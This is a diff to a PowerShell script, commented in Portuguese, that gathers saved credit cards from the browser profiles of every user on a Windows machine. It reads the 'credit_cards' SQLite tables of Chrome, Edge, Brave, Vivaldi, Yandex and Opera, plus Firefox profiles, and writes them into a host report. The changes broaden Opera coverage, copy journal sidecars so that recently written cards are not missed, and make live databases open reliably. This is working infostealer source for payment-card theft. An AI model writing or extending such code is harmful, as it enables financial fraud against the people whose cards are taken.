@@ -42,6 +42,8 @@ function Add-Dbg([string]$msg) {
 Add-Type -Namespace Sqlite -Name Interop -MemberDefinition @'
 [DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl, CharSet=CharSet.Unicode)]
 public static extern int sqlite3_open16(string db, out IntPtr dbh);
+[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl, CharSet=CharSet.Ansi)]
+public static extern int sqlite3_open_v2(string db, out IntPtr dbh, int flags, IntPtr vfs);
 [DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
 public static extern int sqlite3_close(IntPtr dbh);
 [DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl, CharSet=CharSet.Unicode)]
@@ -232,15 +234,15 @@ function Copy-FileShared([string]$src, [string]$dst) {
 
 # remove o DB em temp + sidecars -wal/-shm (SPT PASSO 2)
 function Remove-TempDb([string]$tmp) {
-  foreach ($s in @('', '-wal', '-shm')) { Remove-Item ($tmp + $s) -Force -ErrorAction SilentlyContinue }
+  foreach ($s in @('', '-wal', '-shm', '-journal')) { Remove-Item ($tmp + $s) -Force -ErrorAction SilentlyContinue }
 }
 
 function Copy-DbToTemp([string]$src) {
   $tmp = Join-Path $env:TEMP ("cc_" + [guid]::NewGuid().ToString('N') + ".sqlite")
   [void](Copy-FileShared $src $tmp)
-  # SPT PASSO 1: copia os sidecars -wal/-shm (Chrome/Edge rodam em WAL mode;
-  # a tabela credit_cards pode viver so no -wal). best-effort.
-  foreach ($suffix in @('-wal', '-shm')) {
+  # SPT PASSO 1: copia os sidecars. -wal/-shm (WAL mode: credit_cards pode viver
+  # so no -wal); -journal (DELETE mode: Opera usa rollback journal). best-effort.
+  foreach ($suffix in @('-wal', '-shm', '-journal')) {
     if (Test-Path ($src + $suffix)) { [void](Copy-FileShared ($src + $suffix) ($tmp + $suffix)) }
   }
   return $tmp
@@ -280,12 +282,22 @@ function Cell-Int($cell) {
 
 function Sqlite-Query([string]$dbPath, [string]$sql) {
   $rows = New-Object System.Collections.Generic.List[object]
-  $dbh = [IntPtr]::Zero
-  $rc = [Sqlite.Interop]::sqlite3_open16($dbPath, [ref]$dbh)
-  if ($rc -ne 0 -or $dbh -eq [IntPtr]::Zero) { return $rows }
   $stmt = [IntPtr]::Zero
-  $rc = [Sqlite.Interop]::sqlite3_prepare16_v2($dbh, $sql, -1, [ref]$stmt, [IntPtr]::Zero)
-  if ($rc -ne 0) { [void][Sqlite.Interop]::sqlite3_close($dbh); return $rows }
+  $dbh = [IntPtr]::Zero
+  # 1 = SQLITE_OPEN_READONLY, 4 = SQLITE_OPEN_READWRITE
+  # Tenta READONLY primeiro: um snapshot de DB vivo (journal/WAL) abre limpo em
+  # READONLY; em READWRITE o SQLite tenta rollback/checkpoint e pode falhar o prepare.
+  foreach ($flags in @(1, 4)) {
+    $dbh = [IntPtr]::Zero
+    $stmt = [IntPtr]::Zero
+    $rc = [Sqlite.Interop]::sqlite3_open_v2($dbPath, [ref]$dbh, $flags, [IntPtr]::Zero)
+    if ($rc -ne 0 -or $dbh -eq [IntPtr]::Zero) { continue }
+    $rc2 = [Sqlite.Interop]::sqlite3_prepare16_v2($dbh, $sql, -1, [ref]$stmt, [IntPtr]::Zero)
+    if ($rc2 -eq 0 -and $stmt -ne [IntPtr]::Zero) { break }
+    [void][Sqlite.Interop]::sqlite3_close($dbh)
+    $dbh = [IntPtr]::Zero
+  }
+  if ($stmt -eq [IntPtr]::Zero) { return $rows }
   while (($step = [Sqlite.Interop]::sqlite3_step($stmt)) -eq 100) {   # 100 = SQLITE_ROW
     $nCols = [Sqlite.Interop]::sqlite3_data_count($stmt)
     $row = New-Object object[] $nCols
@@ -294,7 +306,8 @@ function Sqlite-Query([string]$dbPath, [string]$sql) {
   }
   [void][Sqlite.Interop]::sqlite3_finalize($stmt)
   [void][Sqlite.Interop]::sqlite3_close($dbh)
-  return $rows
+  # ',' impede o PowerShell de 'unroll' a List quando tem exatamente 1 linha
+  return ,$rows
 }
 
 function Get-TableColumns([string]$dbPath) {
@@ -498,7 +511,8 @@ function Get-ChromeEdgeCards([string]$userDataDir, [string]$BrowserName) {
       })
     }
   }
-  return $cards
+  # ',' impede o PowerShell de 'unroll' a List quando ha exatamente 1 cartao
+  return ,$cards
 }
 
 # =====================================================================
@@ -530,7 +544,8 @@ function Get-FirefoxCards([string]$profilesDir) {
       }
     }
   }
-  return $cards
+  # ',' impede o PowerShell de 'unroll' a List quando ha exatamente 1 cartao
+  return ,$cards
 }
 
 # =====================================================================
@@ -662,14 +677,21 @@ if ($ElevatedPass) {
 }
 
 # SPT PASSO 9: navegadores Chromium suportados (mesma estrutura User Data)
-# Opera e apontado na raiz "Opera Software" (Local State na raiz; Web Data em "Opera Stable")
 $chromiumBrowsers = @(
   @{ Name='Chrome';  Path='AppData\Local\Google\Chrome\User Data' },
   @{ Name='Edge';    Path='AppData\Local\Microsoft\Edge\User Data' },
   @{ Name='Brave';   Path='AppData\Local\BraveSoftware\Brave-Browser\User Data' },
   @{ Name='Vivaldi'; Path='AppData\Local\Vivaldi\User Data' },
-  @{ Name='Yandex';  Path='AppData\Local\Yandex\YandexBrowser\User Data' },
-  @{ Name='Opera';   Path='AppData\Local\Opera Software' }
+  @{ Name='Yandex';  Path='AppData\Local\Yandex\YandexBrowser\User Data' }
+)
+# Opera tem estrutura irregular: o "Local State" pode estar na raiz "Opera Software"
+# OU em "Opera Software\Opera Stable", e o perfil pode ser em Local OU Roaming.
+# Tenta cada raiz candidata e usa a primeira que tem "Local State".
+$operaRoots = @(
+  'AppData\Local\Opera Software',
+  'AppData\Local\Opera Software\Opera Stable',
+  'AppData\Roaming\Opera Software',
+  'AppData\Roaming\Opera Software\Opera Stable'
 )
 
 $allCards = New-Object System.Collections.Generic.List[object]
@@ -682,10 +704,22 @@ foreach ($up in $users) {
     Add-Dbg "  $($b.Name) dir: $(if ($exists) { 'existe' } else { 'NAO existe' })"
     if ($exists) { $allCards.AddRange((Get-ChromeEdgeCards $dir $b.Name)) }
   }
+  # Opera: usa a primeira raiz candidata que tem "Local State"
+  $operaUsed = $false
+  foreach ($op in $operaRoots) {
+    $dir = Join-Path $up $op
+    if (Test-Path (Join-Path $dir 'Local State')) {
+      Add-Dbg "  Opera dir: $dir"
+      $allCards.AddRange((Get-ChromeEdgeCards $dir 'Opera'))
+      $operaUsed = $true
+      break
+    }
+  }
+  if (-not $operaUsed) { Add-Dbg "  Opera: nenhuma raiz com Local State" }
   Add-Dbg "  Firefox dir: $(if (Test-Path $ff) { 'existe' } else { 'NAO existe' })"
   if (Test-Path $ff) { $allCards.AddRange((Get-FirefoxCards $ff)) }
 }
-$cards = @($allCards)
+$cards = $allCards.ToArray()
 
 $report = Format-Report $cards $hostName $user $os $psVer $isAdmin
 
